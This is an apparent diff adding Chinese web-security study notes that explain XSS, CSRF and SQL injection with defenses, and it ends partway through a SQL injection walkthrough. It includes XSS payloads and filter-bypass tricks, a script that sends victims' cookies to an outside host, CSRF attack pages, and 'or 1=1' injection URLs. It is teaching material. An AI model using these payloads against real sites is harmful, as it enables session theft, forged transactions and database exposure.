@@ -1,0 +1,1011 @@
+<h1>常见几种攻击类型</h1>
+
+<h2>安全面试题</h2>
+
+<p>什么是XSS攻击？什么是SQL注入攻击？什么是CSRF攻击？ <br />
+答： </p>
+
+<h3>- XSS（Cross Site Script，跨站脚本攻击）</h3>
+
+<p>是向网页中注入恶意脚本在用户浏览网页时在用户浏览器中执行恶意脚本的攻击方式。跨站脚本攻击分有两种形式：反射型攻击（诱使用户点击一个嵌入恶意脚本的链接以达到攻击的目标，目前有很多攻击者利用论坛、微博发布含有恶意脚本的URL就属于这种方式）和持久型攻击（将恶意脚本提交到被攻击网站的数据库中，用户浏览网页时，恶意脚本从数据库中被加载到页面执行，QQ邮箱的早期版本就曾经被利用作为持久型跨站脚本攻击的平台）。XSS虽然不是什么新鲜玩意，但是攻击的手法却不断翻新，防范XSS主要有两方面：消毒（对危险字符进行转义）和HttpOnly（防范XSS攻击者窃取Cookie数据）。 </p>
+
+<h3>- SQL注入攻击</h3>
+
+<p>是注入攻击最常见的形式（此外还有OS注入攻击（Struts 2的高危漏洞就是通过OGNL实施OS注入攻击导致的）），当服务器使用请求参数构造SQL语句时，恶意的SQL被嵌入到SQL中交给数据库执行。SQL注入攻击需要攻击者对数据库结构有所了解才能进行，攻击者想要获得表结构有多种方式：（1）如果使用开源系统搭建网站，数据库结构也是公开的（目前有很多现成的系统可以直接搭建论坛，电商网站，虽然方便快捷但是风险是必须要认真评估的）；（2）错误回显（如果将服务器的错误信息直接显示在页面上，攻击者可以通过非法参数引发页面错误从而通过错误信息了解数据库结构，Web应用应当设置友好的错误页，一方面符合最小惊讶原则，一方面屏蔽掉可能给系统带来危险的错误回显信息）；（3）盲注。防范SQL注入攻击也可以采用消毒的方式，通过正则表达式对请求参数进行验证，此外，参数绑定也是很好的手段，这样恶意的SQL会被当做SQL的参数而不是命令被执行，JDBC中的PreparedStatement就是支持参数绑定的语句对象，从性能和安全性上都明显优于Statement。 </p>
+
+<h3>- CSRF攻击（Cross Site Request Forgery，跨站请求伪造）</h3>
+
+<p>是攻击者通过跨站请求，以合法的用户身份进行非法操作（如转账或发帖等）。CSRF的原理是利用浏览器的Cookie或服务器的Session，盗取用户身份，其原理如下图所示。防范CSRF的主要手段是识别请求者的身份，主要有以下几种方式：（1）在表单中添加令牌（token）；（2）验证码；（3）检查请求头中的Referer（前面提到防图片盗链接也是用的这种方式）。令牌和验证都具有一次消费性的特征，因此在原理上一致的，但是验证码是一种糟糕的用户体验，不是必要的情况下不要轻易使用验证码，目前很多网站的做法是如果在短时间内多次提交一个表单未获得成功后才要求提供验证码，这样会获得较好的用户体验。</p>
+
+<p>补充：防火墙的架设是Web安全的重要保障，ModSecurity是开源的Web防火墙中的佼佼者。企业级防火墙的架设应当有两级防火墙，Web服务器和部分应用服务器可以架设在两级防火墙之间的DMZ，而数据和资源服务器应当架设在第二级防火墙之后。</p>
+
+<p> </p>
+
+<h2>XSS跨站脚本攻击初探</h2>
+
+<p>XSS跨站脚本攻击的基本原理和SQL 注入攻击类似（个人观点），都是利用系统执行了未经过滤的危险代码，不同点在于XSS是一种基于网页脚本的注入方式，也就是将脚本攻击载荷写入网页执行以达到对网页客户端访问用户攻击的目的，属于客户端攻击。</p>
+
+<p>XSS跨站脚本攻击的基本原理和SQL 注入攻击类似（个人观点），都是利用系统执行了未经过滤的危险代码，不同点在于XSS是一种基于网页脚本的注入方式，也就是将脚本攻击载荷写入网页执行以达到对网页客户端访问用户攻击的目的，属于客户端攻击。而SQL注入攻击将危险代码绕过正常的文本输入变为可执行的SQL执行语句从而操纵数据库，从而进一步探测、操纵数据库信息。属于服务器攻击？（菜鸟看法）。</p>
+
+<p><strong>XSS攻击前奏（XSS bug 检测）</strong></p>
+
+<p><strong>1、最常见的最经典的XSS bug检测语句必然是</strong></p>
+
+<p><script>alert(/XSS/)</script>                                        ①</p>
+
+<p>比如在存在XSS bug的留言板上写上留言①,当访问留言板网页时会弹出对话框:</p>
+
+<p>这表明我们输入的语句被原样写入的网页并被浏览器执行了.那么我们就有机会执行我们的脚本攻击载荷:</p>
+
+<p><script src = http://www.labsecurity.org/xssbug.js></script></p>
+
+<p>在我们的网络空间上的xssbug.js代码可以是</p>
+
+<p>Var img = document.createElement(“img”);</p>
+
+<p>Img.src = “http://www.labsecurity.org/log?”+escape(document.cookie);</p>
+
+<p>document.body.appendChild(img);</p>
+
+<p>如果我们如上代码顺利执行,那么被攻击者在目标网站的登录cookie就写进了log.得到其cookie后,进行浏览器重新发包就可以以被攻击者身份登录目标网站.(被攻击者可以是普通用户也可以使网站超级管理员).</p>
+
+<p>将窃取cookie的代码换成下载者地址就可以将下载者下载到存在下载者攻击漏洞的用户电脑上.</p>
+
+<p>也可以将代码换成目标用户在网站上的某些操作的 数据包脚本.促使在不知情的情况下”自愿”进行某些操作.</p>
+
+<p>对于Cookie窃取的防御可以使ＩＰ绑定等方案了．</p>
+
+<p>既然存在ＸＳＳ攻击那么程序员在开发时必然会进行某些危险关键字的过滤，以及限制用户的输入长度．这样即使存在ｘｓｓ漏洞．Ｈａｃｋ也只能检测，却不能够写入攻击载荷（长度限制啊）．</p>
+
+<p><strong>2、利用IMG图片标记属性跨站</strong></p>
+
+<p>当然也可以像上面所说的在留言板中输入</p>
+
+<p><img src=”javacript:alert(/XSS/)”></img></p>
+
+<p>这所说的不是这样是在用户上传图片时将图片路径修改为一段可执行的XSS测试脚本.</p>
+
+<p>如果存在XSS漏洞那么此类脚本就会被执行.这类脚本要闭合双引号”>”等.</p>
+
+<p>利用DIV标签属性跨站</p>
+
+<p><div style=”width:0;height:0;background:url(javascript:document.body.onload = function(){alert(/XSS/);};”></div></p>
+
+<p>利用已知事件攻击</p>
+
+<p>移动特效字<marquee>文字</marquee></p>
+
+<p><marquee onstart=”alert(/XSS/)”>文字</marquee></p>
+
+<p>B.<div style=”” onmouseenter=”alert(/XSS/)”>文字</div></p>
+
+<p>构造事件</p>
+
+<p><img style=”#” style=”TEST:e-xpression(alert(/XSS/));”></p>
+
+<p>常用的事件构造</p>
+
+<p><font style = “TEST:e-xpression(alert(/XSS/))”></font></p>
+
+<p><li style = “TEST:e-xpression(alert(/XSS/))”></li></p>
+
+<p><table style = “TEST:e-xpression(alert(/XSS/))”></table></p>
+
+<p><a style = “TEST:e-xpression(alert(/XSS/))”></a></p>
+
+<p><b style = “TEST:e-xpression(alert(/XSS/))”></b></p>
+
+<p><ul style = “TEST:e-xpression(alert(/XSS/))”></ul></p>
+
+<p><marque tyle = “TEST:e-xpression(alert(/XSS/))”></marquee></p>
+
+<p><strong>3、突破程序员的过滤限制</strong></p>
+
+<p>利用javascript换行与空格突破过滤</p>
+
+<p><img src = j ava script:al er t(/XSS/)>///空格使用Tab键产生</p>
+
+<p><img src = j</p>
+
+<p>ava script :a ler t(/xss/)></p>
+
+<p>利用注释<img src = “#”/**/onerror = alert(/XSS/)></p>
+
+<p>转代码,绕过滤</p>
+
+<p>使用大小写转换绕过过滤</p>
+
+<p>使用进制编码</p>
+
+<p>空格回车符</p>
+
+<p>JS 还原函数法</p>
+
+<p>String.fromCharCode()可以将ASCII编码还原成字符串,那么就可以eval(String.fromCharCode(97,108,101.....))</p>
+
+<p>突破长度限制</p>
+
+<p>注释符闭合相邻的输入框达到合并的目的</p>
+
+<p><input id = 1 type = “text” value=””/></p>
+
+<p><input id = 2 type = “text” value = “”/></p>
+
+<p>这样我们可以在第一个框中输入”>alert<!--</p>
+
+<p>在第二个输入框中输入--><script>(/XSS/);</script></p>
+
+<p>这样效果就是</p>
+
+<p><input id = 1 type = “text” value=”” <script>alert(/XSS/)</script>”/></p>
+
+<p>使用<base>标签进行相对路径劫持</p>
+
+<p><body></p>
+
+<p><base href=”http://www.labsecurity.org”/></p>
+
+<p><img src = “evil.js”></p>
+
+<p><body></p>
+
+<p>当我们没有使用base标签时evil.js是调用的服务器根目录下的evil.js脚本文件.当我们使用<base>脚本后.那么在此标签后的所有相对路径为我们设置的网站.</p>
+
+<p>因此可以先使用<base>脚本劫持,然后再写入<img src=”xxx.js”>突破长度限制.</p>
+
+<p><strong>4、使用window.name进行字符串传递</strong></p>
+
+<p>在我们自己的构造的页面中写入如下代码</p>
+
+<p><script></p>
+
+<p>Window.name=”<script src=http://www.labsecurity.org/xss.js><script>”</p>
+
+<p>Window.location=”http://www.xxxx.com/xxx.asp”</p>
+
+<p></script></p>
+
+<p>当我们跳转到目标网页时我们的window.name值为我们设置的跨站脚本语句.</p>
+
+<p>因此我们可以使用eval(name)进行跨站攻击.</p>
+
+<p>利用上下文扩展长度</p>
+
+<p><div id="x">alert%28document.cookie%29%3B</div></p>
+
+<p><limited_xss_point>eval(unescape(x.innerHTML));</limited_xss_point></p>
+
+<p>上文是不限制长度的安全数据,那么我们就可以在下文中使用此安全数据.进行XSS攻击突破长度.</p>
+
+<p><strong>5.利用URL 中的数据</strong></p>
+
+<p>如果页面里不存在上一节所说的可控HTML 上下文数据怎么办？有些数据是我们无条件可控的，第一个想到的就是URL，通过在URL 的尾部参数构造要执行的代码，然后在XSS点通过</p>
+
+<p>document.URL/location.href 等方式获得代码数据执行，这里假设代码从第80 个字符开始到</p>
+
+<p>最后：</p>
+
+<pre>
+ </pre>
+
+<ol>
+<li>http://www.xssedsite.com/xssed.php?x=1....&alert(document.cookie)  </li>
+<li><limited_xss_point>eval(document.URL.substr(80));</limited_xss_point> </li>
+</ol>
+
+<p>长度：30</p>
+
+<pre>
+ </pre>
+
+<ol>
+<li><limited_xss_point>eval(location.href.substr(80));</limited_xss_point> </li>
+</ol>
+
+<p>长度：31</p>
+
+<p>上面两个例子对比，前一个例子更短，那么有没有办法更短呢？通过查阅Javascript 手册</p>
+
+<p>的String 的方法可以发现，切割字符串有一个更短的函数slice，5 个字符比substr 还要短一个字符：</p>
+
+<p><limited_xss_point>eval(document.URL.slice(80));</limited_xss_point></p>
+
+<p>长度：29</p>
+
+<p><limited_xss_point>eval(location.href.slice(80));</limited_xss_point></p>
+
+<p>长度：30</p>
+
+<p>那么还有没有办法更短呢？答案是YES，查阅一下MSND 里的location 对象的参考你会发现有个hash 成员，获取#之后的数据，那么我们可以把要执行的代码放在#后面，然后通过hash获得代码执行，由于获得的数据是#开头的，所以只需要slice 一个字符就可以拿到代码：</p>
+
+<pre>
+ </pre>
+
+<ol>
+<li>http://www.xssedsite.com/xssed.php?x=1....#alert(document.cookie)  </li>
+<li><limited_xss_point>eval(location.hash.slice(1));</limited_xss_point> </li>
+</ol>
+
+<p>长度：29</p>
+
+<p>这样比上面的例子又少了一个字符。那么还可以更短么？</p>
+
+<p><strong>6.剪切板clipboardData</strong></p>
+
+<p>攻击者在自己域的页面上通过clipboardData 把Payload 写入剪切板，然后在被XSS 页面获取并执行该数据。攻击者构造的页面：</p>
+
+<pre>
+ </pre>
+
+<ol>
+<li><script> </li>
+<li>clipboardData.setData("text", "alert(document.cookie)");  </li>
+<li></script> </li>
+</ol>
+
+<p>被XSS 的页面：</p>
+
+<p><limited_xss_point>eval(clipboardData.getData("text"));</limited_xss_point></p>
+
+<p>长度：36</p>
+
+<p>这种方式只适用于IE 系列，并且在IE 7 及以上版本的浏览器会有安全提示。</p>
+
+<p> </p>
+
+<h2>浅谈CSRF攻击方式</h2>
+
+<p><small>2009-04-09 22:44 by hyddd, 237419 阅读, 125 评论, <a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html#" onclick="AddToWz(1432744);return false;">收藏</a>, <a href="https://i.cnblogs.com/EditPosts.aspx?postid=1432744" rel="nofollow">编辑</a></small></p>
+
+<p><strong>一.CSRF是什么？</strong></p>
+
+<p>　　CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
+
+<p><strong>二.CSRF可以做什么？</strong></p>
+
+<p>　　你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。</p>
+
+<p><strong>三.CSRF漏洞现状</strong></p>
+
+<p>　　CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站），YouTube和百度HI......而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。</p>
+
+<p><strong>四.CSRF的原理</strong></p>
+
+<p>　　下图简单阐述了CSRF攻击的思想：</p>
+
+<p>　　<img src="http://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" style="height:498px; width:884px" /></p>
+
+<p>　　从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p>
+
+<p>　　1.登录受信任网站A，并在本地生成Cookie。</p>
+
+<p>　　2.在不登出A的情况下，访问危险网站B。</p>
+
+<p>　　看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</p>
+
+<p>　　1.你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p>
+
+<p>　　2.你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了......）</p>
+
+<p>　　3.上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</p>
+
+<p> </p>
+
+<p>　　上面大概地讲了一下CSRF攻击的思想，下面我将用几个例子详细说说具体的CSRF攻击，这里我以一个银行转账的操作作为例子（仅仅是例子，真实的银行网站没这么傻:>）</p>
+
+<p><strong>　　示例1：</strong></p>
+
+<p>　　银行网站A，它以GET请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&money=1000</p>
+
+<p>　　危险网站B，它里面有一段HTML的代码如下：</p>
+
+<p>　　<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000></p>
+
+<p>　　首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块......</p>
+
+<p>　　为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“http://www.mybank.com/Transfer.php?toBankId=11&money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作......</p>
+
+<p>　　<strong>示例2：</strong></p>
+
+<p>　　为了杜绝上面的问题，银行决定改用POST请求完成转账操作。</p>
+
+<p>　　银行网站A的WEB表单如下：　　</p>
+
+<p>　　<form action="Transfer.php" method="POST"><br />
+　　　　<p>ToBankId: <input type="text" name="toBankId" /></p><br />
+　　　　<p>Money: <input type="text" name="money" /></p><br />
+　　　　<p><input type="submit" value="Transfer" /></p><br />
+　　</form></p>
+
+<p>　　后台处理页面Transfer.php如下：</p>
+
+<p>　　<?php<br />
+　　　　session_start();<br />
+　　　　if (isset($_REQUEST['toBankId'] &&　isset($_REQUEST['money']))<br />
+　　　　{<br />
+　　　　    buy_stocks($_REQUEST['toBankId'],　$_REQUEST['money']);<br />
+　　　　}<br />
+　　?></p>
+
+<p>　　危险网站B，仍然只是包含那句HTML代码：</p>
+
+<p>　　<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000></p>
+
+<p>　　和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果.....和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了$_REQUEST去获取请求的数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。</p>
+
+<p>　　<strong>示例3：</strong></p>
+
+<p>　　经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下：</p>
+
+<p>　　<?php<br />
+　　　　session_start();<br />
+　　　　if (isset($_POST['toBankId'] &&　isset($_POST['money']))<br />
+　　　　{<br />
+　　　　    buy_stocks($_POST['toBankId'],　$_POST['money']);<br />
+　　　　}<br />
+　　?></p>
+
+<p>　　然而，危险网站B与时俱进，它改了一下代码：</p>
+
+<p><html><br />
+　　<head><br />
+　　　　<script type="text/javascript"><br />
+　　　　　　function steal()<br />
+　　　　　　{<br />
+          　　　　 iframe = document.frames["steal"];<br />
+　　     　　      iframe.document.Submit("transfer");<br />
+　　　　　　}<br />
+　　　　</script><br />
+　　</head><br />
+<br />
+　　<body onload="steal()"><br />
+　　　　<iframe name="steal" display="none"><br />
+　　　　　　<form method="POST" name="transfer"　action="http://www.myBank.com/Transfer.php"><br />
+　　　　　　　　<input type="hidden" name="toBankId" value="11"><br />
+　　　　　　　　<input type="hidden" name="money" value="1000"><br />
+　　　　　　</form><br />
+　　　　</iframe><br />
+　　</body><br />
+</html></p>
+
+<p>如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块......因为这里危险网站B暗地里发送了POST请求到银行!</p>
+
+<p>　　总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个<img>就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。</p>
+
+<p>　　理解上面的3种攻击模式，其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p>
+
+<p><strong>五.CSRF的防御</strong></p>
+
+<p>　　我总结了一下看到的资料，CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。</p>
+
+<p>　　<strong>1.服务端进行CSRF防御</strong></p>
+
+<p>　　服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。</p>
+
+<p>　　(1).Cookie Hashing(所有表单都包含同一个伪随机值)：</p>
+
+<p>　　这可能是最简单的解决方案了，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败了:></p>
+
+<p>　　<?php<br />
+　　　　//构造加密的Cookie信息<br />
+　　　　$value = “DefenseSCRF”;<br />
+　　　　setcookie(”cookie”, $value, time()+3600);<br />
+　　?></p>
+
+<p>　　在表单里增加Hash值，以认证这确实是用户发送的请求。</p>
+
+<p>　　<?php<br />
+　　　　$hash = md5($_COOKIE['cookie']);<br />
+　　?><br />
+　　<form method=”POST” action=”transfer.php”><br />
+　　　　<input type=”text” name=”toBankId”><br />
+　　　　<input type=”text” name=”money”><br />
+　　　　<input type=”hidden” name=”hash” value=”<?=$hash;?>”><br />
+　　　　<input type=”submit” name=”submit” value=”Submit”><br />
+　　</form></p>
+
+<p>　　然后在服务器端进行Hash值验证</p>
+
+<p>      <?php<br />
+　　      if(isset($_POST['check'])) {<br />
+     　　      $hash = md5($_COOKIE['cookie']);<br />
+          　　 if($_POST['check'] == $hash) {<br />
+               　　 doJob();<br />
+　　           } else {<br />
+　　　　　　　　//...<br />
+          　　 }<br />
+　　      } else {<br />
+　　　　　　//...<br />
+　　      }<br />
+      ?></p>
+
+<p>　　这个方法个人觉得已经可以杜绝99%的CSRF攻击了，那还有1%呢....由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，这就另外的1%。一般的攻击者看到有需要算Hash值，基本都会放弃了，某些除外，所以如果需要100%的杜绝，这个不是最好的方法。<br />
+　　(2).验证码</p>
+
+<p>　　这个方案的思路是：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，厄....这个方案可以完全解决CSRF，但个人觉得在易用性方面似乎不是太好，还有听闻是验证码图片的使用涉及了一个被称为MHTML的Bug，可能在某些版本的微软IE中受影响。</p>
+
+<p>　　(3).One-Time Tokens(不同的表单包含一个不同的伪随机值)</p>
+
+<p>　　在实现One-Time Tokens时，需要注意一点：就是“并行会话的兼容”。如果用户在一个站点上同时打开了两个不同的表单，CSRF保护措施不应该影响到他对任何表单的提交。考虑一下如果每次表单被装入时站点生成一个伪随机值来覆盖以前的伪随机值将会发生什么情况：用户只能成功地提交他最后打开的表单，因为所有其他的表单都含有非法的伪随机值。必须小心操作以确保CSRF保护措施不会影响选项卡式的浏览或者利用多个浏览器窗口浏览一个站点。</p>
+
+<p>　　以下我的实现:</p>
+
+<p>　　1).先是令牌生成函数(gen_token())：</p>
+
+<p>     <?php<br />
+     function gen_token() {<br />
+　　　　//这里我是贪方便，实际上单使用Rand()得出的随机数作为令牌，也是不安全的。<br />
+　　　　//这个可以参考我写的Findbugs笔记中的<a href="https://www.cnblogs.com/hyddd/articles/1391737.html">《Random object created and used only once》</a><br />
+          $token = md5(uniqid(rand(), true));<br />
+          return $token;<br />
+     }</p>
+
+<p>　　2).然后是Session令牌生成函数(gen_stoken())：</p>
+
+<p>     <?php<br />
+     　　function gen_stoken() {<br />
+　　　　　　$pToken = "";<br />
+　　　　　　if($_SESSION[STOKEN_NAME]  == $pToken){<br />
+　　　　　　　　//没有值，赋新值<br />
+　　　　　　　　$_SESSION[STOKEN_NAME] = gen_token();<br />
+　　　　　　}    <br />
+　　　　　　else{<br />
+　　　　　　　　//继续使用旧的值<br />
+　　　　　　}<br />
+     　　}<br />
+     ?></p>
+
+<p>　　3).WEB表单生成隐藏输入域的函数：　　</p>
+
+<p>     <?php<br />
+　　     function gen_input() {<br />
+     　　     gen_stoken();<br />
+　　          echo “<input type=\”hidden\” name=\”" . FTOKEN_NAME . “\”<br />
+          　　     value=\”" . $_SESSION[STOKEN_NAME] . “\”> “;<br />
+     　　}<br />
+     ?></p>
+
+<p>　　4).WEB表单结构：</p>
+
+<p>     <?php<br />
+          session_start();<br />
+          include(”functions.php”);<br />
+     ?><br />
+     <form method=”POST” action=”transfer.php”><br />
+          <input type=”text” name=”toBankId”><br />
+          <input type=”text” name=”money”><br />
+          <? gen_input(); ?><br />
+          <input type=”submit” name=”submit” value=”Submit”><br />
+     </FORM></p>
+
+<p><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img alt="复制代码" src="https://common.cnblogs.com/images/copycode.gif" /></a></p>
+
+<p>　　5).服务端核对令牌：</p>
+
+<p>　　这个很简单，这里就不再啰嗦了。</p>
+
+<p>　　上面这个其实不完全符合“并行会话的兼容”的规则，大家可以在此基础上修改。</p>
+
+<p> </p>
+
+<p>　　其实还有很多想写，无奈精力有限，暂且打住，日后补充，如果错漏，请指出:></p>
+
+<p>　　PS：今天下午写这篇文档的时候FF崩溃了一次，写了一半文章的全没了，郁闷好久T_T.......</p>
+
+<p>　　转载请说明出处，谢谢[hyddd(http://www.cnblogs.com/hyddd/)]</p>
+
+<p><strong>六.参考文献</strong></p>
+
+<p>[1].<a href="http://www.playhack.net/view.php?id=31">Preventing CSRF</a></p>
+
+<p>[2].<a href="http://shiflett.org/articles/cross-site-request-forgeries">Security Corner: Cross-Site Request Forgeries</a></p>
+
+<p>[3].<a href="http://netsecurity.51cto.com/art/200812/102951.htm">《深入解析跨站请求伪造漏洞：原理剖析》</a></p>
+
+<p>[4].<a href="http://netsecurity.51cto.com/art/200811/97281.htm">《Web安全测试之跨站请求伪造（CSRF）》</a></p>
+
+<p>[5].<a href="http://netsecurity.51cto.com/art/200812/102925.htm">《深入解析跨站请求伪造漏洞：实例讲解》</a></p>
+
+<p>[6].http://baike.baidu.com/view/1609487.htm</p>
+
+<p> </p>
+
+<h2>SQL注入原理讲解，很不错！</h2>
+
+<p>原文地址：http://www.cnblogs.com/rush/archive/2011/12/31/2309203.html</p>
+
+<h3>1.1.1 摘要</h3>
+
+<p>日前，国内最大的程序员社区CSDN网站的用户数据库被黑客公开发布，600万用户的登录名及密码被公开泄露，随后又有多家网站的用户密码被流传于网络，连日来引发众多网民对自己账号、密码等互联网信息被盗取的普遍担忧。</p>
+
+<p>网络安全成为了现在互联网的焦点，这也恰恰触动了每一位用户的神经，由于设计的漏洞导致了不可收拾的恶果，验证了一句话“出来混的，迟早是要还的”，所以我想通过专题博文介绍一些常用的攻击技术和防范策略。</p>
+
+<p>SQL Injection也许很多人都知道或者使用过，如果没有了解或完全没有听过也没有关系，因为接下来我们将介绍SQL Injection。</p>
+
+<p> </p>
+
+<h3>1.1.2 正文</h3>
+
+<p>SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+
+<p>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
+
+<p>首先让我们了解什么时候可能发生SQL Injection。</p>
+
+<p>假设我们在浏览器中输入URL <a href="http://www.sample.com/" target="_blank">www.sample.com</a>，由于它只是对页面的简单请求无需对数据库动进行动态请求，所以它不存在SQL Injection，当我们输入<a href="http://www.sample.com/?testid=23" target="_blank">www.sample.com?testid=23</a>时，我们在URL中传递变量testid，并且提供值为23，由于它是对数据库进行动态查询的请求（其中?testid＝23表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。</p>
+
+<p>现在我们知道SQL Injection适用场合，接下来我们将通过具体的例子来说明SQL Injection的应用，这里我们以<a href="http://www.microsoft.com/download/en/details.aspx?id=23654" target="_blank">pubs</a>数据库作为例子。</p>
+
+<p>我们通过Web页面查询job表中的招聘信息，job表的设计如下：</p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828006326.png" target="_blank"><img alt="sqlinjection5" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828013785.png" style="height:149px; width:216px" title="sqlinjection5" /></a></p>
+
+<p>图1 jobs表</p>
+
+<p> </p>
+
+<p>接着让我们实现Web程序，它根据工作Id（job_id）来查询相应的招聘信息，示意代码如下：</p>
+
+<p> </p>
+
+<pre>
+/// <summary>
+/// Handles the Load event of the Page control.
+/// </summary>
+/// <param name="sender">The source of the event.</param>
+/// <param name="e">The <see cref="System.EventArgs"/> instance containing the event data.</param>
+protected void Page_Load(object sender, EventArgs e)
+{
+if (!IsPostBack)
+{
+// Gets departmentId from http request.
+string queryString = Request.QueryString["departmentID"];
+if (!string.IsNullOrEmpty(queryString))
+{
+// Gets data from database.
+gdvData.DataSource = GetData(queryString.Trim());
+
+// Binds data to gridview.
+gdvData.DataBind();
+}
+}
+}</pre>
+
+<p> </p>
+
+<p>现在我们已经完成了Web程序，接下来让我们查询相应招聘信息吧。</p>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/20120101082801895.png" target="_blank"><img alt="sqlinjection6" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828028321.png" style="height:284px; width:461px" title="sqlinjection6" /></a></p>
+
+<p>图2 job表查询结果</p>
+
+<p> </p>
+
+<p>如图所示，我们要查询数据库中工作Id值为1的工作信息，而且在页面显示了该工作的Id，Description，Min Lvl和Max Lvl等信息。</p>
+
+<p>现在要求我们实现根据工作Id查询相应工作信息的功能，想必大家很快可以给出解决方案，SQL示意代码如下：</p>
+
+<p> </p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl
+FROM jobs
+WHERE (job_id = 1)</pre>
+
+<p> </p>
+
+<p>假设现在要求我们获取Department表中的所有数据，而且必须保留WHERE语句，那我们只要确保WHERE恒真就OK了，SQL示意代码如下：</p>
+
+<p> </p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl
+FROM jobs
+WHERE (job_id = 1) OR 1 = 1
+</pre>
+
+<p> </p>
+
+<p>上面我们使得WHERE恒真，所以该查询中WHERE已经不起作用了，其查询结果等同于以下SQL语句。</p>
+
+<p> </p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl
+FROM jobs
+</pre>
+
+<p> </p>
+
+<p>SQL查询代码实现如下：</p>
+
+<p> </p>
+
+<pre>
+string sql1 = string.Format(
+"SELECT job_id, job_desc, min_lvl, max_lvl FROM jobs WHERE job_id='{0}'", jobId);</pre>
+
+<p> </p>
+
+<p>现在我们要通过页面请求的方式，让数据库执行我们的SQL语句，我们要在URL中嵌入恶意表达式1=1（或2=2等等），如下URL所示：</p>
+
+<p><a href="http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1%27or%271%27=%271" target="_blank">http://localhost:3452/ExcelUsingXSLT/Default.aspx?jobid=1'or'1'='1</a></p>
+
+<p> </p>
+
+<p>等效SQL语句如下：</p>
+
+<p> </p>
+
+<pre>
+SELECT job_id, job_desc, min_lvl, max_lvl
+FROM jobs
+WHERE job_id = '1' OR '1' = 1'</pre>
+
+<p> </p>
+
+<p><a href="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828048122.png" target="_blank"><img alt="sqlinjection7" src="http://images.cnblogs.com/cnblogs_com/rush/201201/201201010828054435.png" style="height:540px; width:480px" title="sqlinjection7" /></a></p>
+
+<p>图3 job表查询结果</p>
+
+<p> </p>
+
+<p>现在我们把job表中的所有数据都查询出来了，仅仅通过一个简单的恒真表达式就可以进行了一次简单的攻击。</p>
+
+<p>虽然我们把job表的数据都查询出来了，但数据并没有太大的价值，由于我们把该表临时命名为job表，所以接着我们要找出该表真正表名。</p>
+
+<p>首先我们假设表名就是job，然后输入以下URL：</p>
+
